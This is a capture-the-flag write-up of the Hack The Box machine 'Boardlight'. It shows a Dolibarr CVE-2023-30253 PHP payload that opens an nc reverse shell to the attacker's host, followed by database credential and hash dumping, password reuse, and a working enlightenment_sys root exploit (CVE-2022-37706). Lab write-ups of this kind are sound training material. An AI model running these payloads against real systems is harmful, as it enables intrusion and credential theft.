---
title: "Boardlight"
date: 2025-08-15 14:13:00 +0500
categories: [Boxes]
tags: [HTB, Box, Linux, Easy, Authenticated RCE, CVE-2023-30253,]
---

## Recon

### Port Discovery

```bash
sudo nmap -PN -sC -sV -oN boardlight 10.10.11.11
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 14:12 PKT
Nmap scan report for 10.10.11.11
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.92 seconds
```

Let's interact with Port 80.

### Web Enumeration

#### Fingerprinting

```bash
whatweb 10.10.11.11                                                                  
http://10.10.11.11 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@board.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.11], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]
```

![alt text](/assets/images/boardlight-web.png)

There isn't much on the web page. Let's start by enumerating for vhost.

#### vhost Enumeration

```bash
gobuster vhost -u http://board.htb -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt --append-domain -t 60
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://board.htb
[+] Method:          GET
[+] Threads:         60
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: crm.board.htb Status: 200 [Size: 6360]
Progress: 2280 / 2281 (99.96%)
===============================================================
Finished
===============================================================
```

Let's add the subdomain `crm` to our `/etc/hosts` file. Then let's interact with the subdomain.

### crm.board.htb

![alt text](/assets/images/boardlight-crm.png)

On trying the default credentials `admin:admin` we are able to authenticate.

Let's search for any known vulnerabilities in Dolibarr CRM 17.0.0

There's an authenticated RCE associated with Dolibarr CRM 17.0.0

[CVE-2023-30253](https://nvd.nist.gov/vuln/detail/CVE-2023-30253)

Dolibarr before 17.0.1 allows remote code execution by an authenticated user via an uppercase manipulation: <?PHP instead of <?php in injected data.

We are able to create a website?

![alt text](/assets/images/boardlight-dolibarr.png)

## Foothold

To get a foothold we will create a website (give it any name), then create a page (again any name).

- Then on that page `Edit HTML Source`. 
- Insert this payload between the `<section></section>`:

```php
<?PHP system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.30 1234 >/tmp/f"); ?>
```

- Save.
- Enable show dynamic content.
- You have a shell.

```bash
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.30] from (UNKNOWN) [10.10.11.11] 39224
sh: 0: can't access tty; job control turned off
$ whoami
www-data

$ python3 -c "import pty; pty.spawn('/bin/bash');"
```

We find some creds:

```bash
cat conf/conf.php                                  
$dolibarr_main_db_user='dolibarrowner';                                                                                                                                                                       
$dolibarr_main_db_pass='serverfun2$2023!!';                                                                                  
$dolibarr_main_db_type='mysqli';                                                                                       
```

### Enumerating mysql

Time to check what the database hides:

```bash
www-data@boardlight:~$ mysql -u dolibarrowner -p
use dolibarr;

mysql> select * from llx_user;
<SNIP>
|     1 |      0 |              | NULL    |     1 |        1 |                0 | 2024-05-13 13:21:56 | 2024-05-13 13:21:56 |          NULL |          NULL | dolibarr | NULL          | NULL | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm | NULL      | NULL         |        |          | SuperAdmin |           |         |      |      |     NULL |       NULL | NULL  | NULL        |      |              |            |             |                 |       |                |           | null           |   NULL |         NULL |      NULL |    NULL |                      NULL |                      NULL | NULL    | NULL    | NULL    |             |              | NULL      | 2024-05-15 09:57:04 | 2024-05-13 23:23:59 | NULL                   | NULL              | NULL            | 10.10.14.31 | 10.10.14.41     |          NULL |          | NULL   |      1 | NULL  | NULL |       | NULL    |               0 |                  |          0 | NULL | NULL |   NULL |        NULL | NULL           | NULL              |        NULL | NULL       |          NULL |                  NULL |                              |         NULL |
|     2 |      1 |              | NULL    |     0 |        1 |                0 | 2024-05-13 13:24:01 | 2024-05-15 09:58:40 |          NULL |          NULL | admin    | NULL          | NULL | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 | NULL      | yr6V3pXd9QEI | NULL   |          | admin      |           |         |      |      |     NULL |       NULL | NULL  | NULL        |      |              |            |             |                 |       |                |           | []             |   NULL |         NULL |      NULL |    NULL |                      NULL |                      NULL | NULL    | NULL    | NULL    |             |              | NULL      | 2025-08-15 02:54:01 | 2024-05-17 00:19:27 | NULL                   | NULL              | NULL            | 10.10.16.30 | 10.10.14.41     |          NULL |          | NULL   |      1 | NULL  | NULL |       | NULL    |               0 |                  |          0 | NULL | NULL |   NULL |        NULL | NULL           | NULL              |        NULL | NULL       |          NULL |                  NULL |                              |         NULL |
<SNIP>
2 rows in set (0.00 sec)

```

We have a bcrypt hash:

`$2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm`

### Shell as larissa

Nevermind, this was a rabbit hole. We can simply `su` as larissa without having to crack the hash. `larissa:serverfun2$2023!!`. We can also ssh using the creds.

## Privilege Escalation

#### LinPEAS

From the output on LinPEAS: 

```bash
Vulnerable to CVE-2021-3560
```

But I am certain this isn't intended as the user directory has some unusual directories. 

```bash
larissa@boardlight:~$ ls -la
total 80
drwxr-x--- 16 larissa larissa 4096 Aug 15 03:04 .
drwxr-xr-x  3 root    root    4096 May 17  2024 ..
lrwxrwxrwx  1 root    root       9 Sep 18  2023 .bash_history -> /dev/null
-rw-r--r--  1 larissa larissa  220 Sep 17  2023 .bash_logout
-rw-r--r--  1 larissa larissa 3771 Sep 17  2023 .bashrc
drwx------  2 larissa larissa 4096 Aug 15 03:03 .cache
drwx------ 12 larissa larissa 4096 May 17  2024 .config
drwxr-xr-x  2 larissa larissa 4096 May 17  2024 Desktop
drwxr-xr-x  2 larissa larissa 4096 May 17  2024 Documents
drwxr-xr-x  3 larissa larissa 4096 May 17  2024 Downloads
drwx------  3 larissa larissa 4096 Aug 15 03:04 .gnupg
drwxr-xr-x  3 larissa larissa 4096 May 17  2024 .local
drwxr-xr-x  2 larissa larissa 4096 May 17  2024 Music
lrwxrwxrwx  1 larissa larissa    9 Sep 18  2023 .mysql_history -> /dev/null
drwxr-xr-x  2 larissa larissa 4096 May 17  2024 Pictures
-rw-r--r--  1 larissa larissa  807 Sep 17  2023 .profile
drwxr-xr-x  2 larissa larissa 4096 May 17  2024 Public
drwx------  2 larissa larissa 4096 May 17  2024 .run
drwx------  2 larissa larissa 4096 May 17  2024 .ssh
drwxr-xr-x  2 larissa larissa 4096 May 17  2024 Templates
-rw-r-----  1 root    larissa   33 Aug 15 02:52 user.txt
drwxr-xr-x  2 larissa larissa 4096 May 17  2024 Videos
```

Also from LinPEAS output:

```bash
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                                            
                      ╚════════════════════════════════════╝                                                                                                                                                  
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                               
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device                                                                                                                                     
-rwsr-sr-x 1 root root 15K Apr  8  2024 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys  --->  Before_0.25.4_(CVE-2022-37706)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd  --->  Before_0.25.4_(CVE-2022-37706)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight  --->  Before_0.25.4_(CVE-2022-37706)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 467K Jan  2  2024 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root dip 386K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 55K Apr  9  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 163K Apr  4  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 67K Apr  9  2024 /usr/bin/su
-rwsr-xr-x 1 root root 84K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 39K Apr  9  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 87K Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 67K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 52K Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 15K Oct 27  2023 /usr/bin/vmware-user-suid-wrapper
```

There's a LPE exploit associated with enlightenment_sys:

[LPE](https://www.exploit-db.com/exploits/51180)

```bash
larissa@boardlight:~/.config$ mkdir -p /tmp/net
larissa@boardlight:~/.config$ mkdir -p "/dev/../tmp/;/tmp/exploit"
larissa@boardlight:~$ echo "/bin/sh" > /tmp/exploit
larissa@boardlight:~$ chmod a+x /tmp/exploit

larissa@boardlight:/usr/lib/x86_64-linux-gnu/enlightenment/utils$ ./enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root
```

---
